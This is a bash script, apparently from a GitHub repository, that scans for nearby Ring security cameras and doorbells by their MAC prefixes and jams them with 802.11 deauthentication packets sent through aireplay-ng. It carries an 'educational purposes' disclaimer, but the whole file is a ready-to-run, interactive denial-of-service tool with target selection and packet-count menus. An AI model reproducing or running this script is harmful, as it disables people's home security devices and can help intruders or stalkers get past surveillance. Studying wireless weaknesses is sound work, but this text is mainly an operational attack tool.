#!/bin/bash
# Interactive bash script that searches for nearby Ring devices and allows you to 'DoS' them using aireplay-ng to send disassocation packets
# NOTE: THIS IS FOR EDUCATIONAL PURPOSES AND TO SHOW THE WEAKNESS IN THE 802.11 STANDARD AND WIRELESS DEVICES
# Credit https://github.com/kok4i/

# Create output directory
sudo mkdir /tmp/rdos/

# ASCII art
ascii_art() {
    cat << "EOF"
       __   _             _____        _____      _        
      / /  (_)           |  __ \      / ____|    | |       
     / / __ _ _ __   __ _| |  | | ___| (___   ___| |__     
    / / '__| | '_ \ / _` | |  | |/ _ \\___ \ / __| '_ \    
 _ / /| |  | | | | | (_| | |__| | (_) |___) |\__ \ | | |   
(_)_/ |_|  |_|_| |_|\__, |_____/ \___/_____(_)___/_| |_|   
                     __/ |                                 
                    |___/
EOF
}

# Function for centering text 
print_centered_text() {
    local text="$1"
    local term_width=$(tput cols)
    local padding_length=$(( (term_width - ${#text}) / 2 ))
    local padding=""
    for ((i = 0; i < padding_length; i++)); do
        padding+=" "
    done
    printf "${padding}${text}${padding}"
}

# Function to run when Ctrl+C is pressed
custom_interrupt() {
    clear
    printf "Ctrl+C detected, cleaning up and returning to station mode...\n"
    sudo airmon-ng stop $INF > /dev/null 2>&1
    sudo rm -rf /tmp/rdos > /dev/null 2>&1
    exit 1  # Exit the script
}

# Custom exit function
custom_exit() {
    printf "Cleaning up and returning to station mode...\n"
    sudo rm -rf /tmp/rdos > /dev/null 2>&1
    sudo airmon-ng stop $INF > /dev/null 2>&1
    exit 1 # Exit the script
}

# Set up the custom action for Ctrl+C
trap custom_interrupt SIGINT

# Custom exit action
trap custom_exit EXIT

# Prechecks before script runs
# Check for root
if [ "$EUID" -ne 0 ]; then 
    printf "Please run as root\n"
    sleep 2; exit 1
fi

# Print logo art
ascii_art

# Check for aircrack-ng
if which aircrack-ng | grep -q 'aircrack-ng'; then
    printf 'aircrack-ng toolkit check passed!\n'
else    
    printf "aircrack-ng toolkit check failed. Make sure it's installed before continuing!\n"
    sleep 2; exit 1
fi

# Check for iwconfig
if which iwconfig | grep -q 'iwconfig'; then
    printf 'iwconfig check passed!\n'
else    
    printf "iwconfig check failed. Make sure it's installed before continuing!\n"
    sleep 2; exit 1
fi

# Clear screen and reprint art
clear
ascii_art

# Get a list of wireless interfaces
wireless_interfaces=($(iwconfig 2>/dev/null | grep -E '^[[:alnum:]]+\s+IEEE 802\.11' | awk '{print $1}'))

# Check if there are no wireless interfaces
if [ ${#wireless_interfaces[@]} -eq 0 ]; then
    printf "No wireless interfaces found.\n"
    exit 1
fi

# Create an associative array to map numbers to interface names
declare -A interface_map
index=1 # Initialize the index to 1
for interface in "${wireless_interfaces[@]}"; do
    interface_map["$index"]="$interface"
    ((index++)) # Increment the index for the next interface
done

# Display the menu
printf "Select a wireless interface:\n"
for key in "${!interface_map[@]}"; do
    echo "$key: ${interface_map[$key]}"
done

# Prompt the user for their choice
while true; do
    read -p "Enter the number of the wireless interface you want to use: " choice
    # Validate the choice
    if [[ -n ${interface_map[$choice]} ]]; then
        ITMP="${interface_map[$choice]}"
        break
    else
        printf "Invalid choice. Please enter a valid number.\n"
    fi
done

# Grabs the users new wireless interface that is in monitor mode
INF=$(sudo airmon-ng start $ITMP | grep -oP '\b\w+mon\b' | awk '!/airmon|daemon/')
sleep 1; clear

# Airodump scan function
airodump_scan() {
    printf 'Executing airodump-ng..\nPress Ctrl+C to stop the capture and press the A key to cycle between modes while viewing\n'
    sleep 3; clear
    sudo airodump-ng -i $INF --manufacturer -w /tmp/rdos/airodump --output-format csv
}

# Run airodump 
airodump_scan

# ring filter search function
ring_filter_search() {
    if ! grep -qE '54:E0:19|5C:47:5E|9C:76:13|34:3E:A4|64:9A:63|90:48:6C' /tmp/rdos/airodump*.csv; then
        while true; do
            clear
            print_centered_text '\e[1;31mNo ring devices found!\e[0m\n'
            sleep 2
            clear
            read -p "Do you want to run the scan again?[y/n(exit)]: " choice1
            case "$choice1" in
                [Yy]*)
                    # Remove the previous airodump output
                    sudo rm -r /tmp/rdos/airodump*
                    # Start airodump-ng
                    airodump_scan
                    if grep -qE '54:E0:19|5C:47:5E|9C:76:13|34:3E:A4|64:9A:63|90:48:6C' /tmp/rdos/airodump*.csv; then # Check if devices match the filter
                        clear
                        print_centered_text '\e[1;31mRing devices found!\e[0m'
                        sleep 1
                        break
                    fi
                    ;;
                [Nn]*)
                    exit 0
                    ;;
                *)
                    printf "Invalid choice. Please enter 'y' or 'n'.\n"
                    ;;
            esac
        done
    else
        # Print the header
        clear
        print_centered_text '\e[1;31mRing devices found!\e[0m'
        sleep 1
    fi
}

# Run ring filter search function
ring_filter_search

clear

# Start aireplay attack function
aireplay_attack() {
    bssid_mac_select() {
        printf "\e[1;97mStation MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs\n\e[0m"
        grep --color -E '54:E0:19|5C:47:5E|9C:76:13|34:3E:A4|64:9A:63|90:48:6C' /tmp/rdos/airodump*.csv
        # Function to validate if a string is a valid MAC address
        is_valid_mac() {
            local mac="$1"
            # Use a regular expression to match the MAC address format
            if [[ $mac =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
                return 0  # Valid MAC address
            else
                return 1  # Invalid MAC address
            fi
        }
        while true; do
            read -p "Enter BSSID of target: " BSSID
            read -p "Enter MAC of target: " MAC

            bssid_valid=0
            mac_valid=0

            # Check if BSSID is a valid MAC address
            if is_valid_mac "$BSSID"; then
                bssid_valid=1
            else
                printf "Invalid BSSID. Please enter a valid MAC address.\n"
            fi

            # Check if MAC is a valid MAC address
            if is_valid_mac "$MAC"; then
                mac_valid=1
            else
                printf "Invalid MAC address. Please enter a valid MAC address.\n"
            fi

            # Check both validity conditions
            if [ $bssid_valid -eq 1 ] && [ $mac_valid -eq 1 ]; then
                break  # Exit the loop when both are valid
            fi
        done
    }
    bssid_mac_select
    CHNL=$(awk -F, -v BSSID="$BSSID" '$0 ~ BSSID {split($0, fields, ",");channel = gensub(/[^0-9]+/, "", "g", fields[4]); print channel}' /tmp/rdos/airodump*.csv)
    # put aireplay deauth packet count here selection!!!!!!!!!!!!!!!!
    while true; do
        clear
        echo "*********************"
        echo "[F] A few (25)"
        echo "[M] Many (100)"
        echo "[C] Custom"
        echo "*********************"
        read -p "How many dissasociation packets do you want to send to $MAC?: " choice3
        case "$choice3" in
            [Ff]*)
                packetct="25"
                break
                ;;
            [Mm]*)
                packetct="100"
                break
                ;;
            [Cc]*)
                read -p "Enter amount: " packetct
                break
                ;;
            *)
                echo "Invalid choice. Please enter 'f' 'm' or 'c'."
        esac
    done
    printf "Setting $INF to station mode.\n"
    sudo airmon-ng stop $INF > /dev/null 2>&1
    printf "Setting $ITMP to monitor on channel $CHNL.\n"
    sudo airmon-ng start $ITMP $CHNL > /dev/null 2>&1       
    while true; do
        printf "Attemping to dissasociate \e[1;97m$MAC\e[0m...\n"
        aireout=$(sudo aireplay-ng -0 $packetct -a $BSSID -c $MAC $INF | tee /dev/tty) # Running the aireplay attack into a variable aireout so grep can read the output
        
        if echo "$aireout" | grep -q "No such BSSID available"; then
            while true; do
                read -p "Would you like to run aireplay-ng again?[y/n(exit)]: " choice4
                case "$choice4" in
                    [Yy]*)
                        printf "Running aireplay-ng again...\n"
                        clear
                        aireloopout=$(sudo aireplay-ng -0 $packetct -a $BSSID -c $MAC $INF | tee /dev/tty)
                        printf "$aireloopout\n"
                        if ! echo "$aireloopout" | grep -q "No such BSSID available"; then
                            break
                        fi
                        ;;
                    [Nn]*)
                        exit 0
                        ;;
                    *)
                        printf "Invalid choice. Please enter 'y' or 'n'.\n"
                        clear
                esac
            done
        else
            printf "Dissasociation attack completed successfully\n"
            sleep 2
            break
        fi
    done
}

# Run the start_aireplay_attack function
aireplay_attack 

# End menu loop
while true; do
    # Function to display the menu
    display_menu() {
        clear
        ascii_art
        echo "**********************************************"
        echo "1. Restart Script"
        echo "2. Run Aireplay Attack Again"
        echo "3. Quit"
        echo "**********************************************"
        read -p "You have reached the end of this script. Select the next option: " choice5
    }    
    display_menu
    case "$choice5" in
        1)
            clear
            printf "Restarting the script...\n"
            sleep 2
            sudo rm -r /tmp/rdos/airodump* > /dev/null 2>&1
            printf "Setting $INF to station mode.\n"
            sudo airmon-ng stop $INF > /dev/null 2>&1
            printf "Setting $ITMP to monitor mode.\n"
            sudo airmon-ng start $ITMP > /dev/null 2>&1
            airodump_scan
            ring_filter_search
            aireplay_attack
            ;;
        2)
            clear
            printf "Running Aireplay Attack again...\n"
            sleep 2
            start_aireplay_attack
            ;;
        3)
            clear
            exit 0
            ;;
        *)
            clear
            printf "Invalid choice. Please enter '1', '2', or '3'.\n"
            sleep 2
            ;;
    esac
done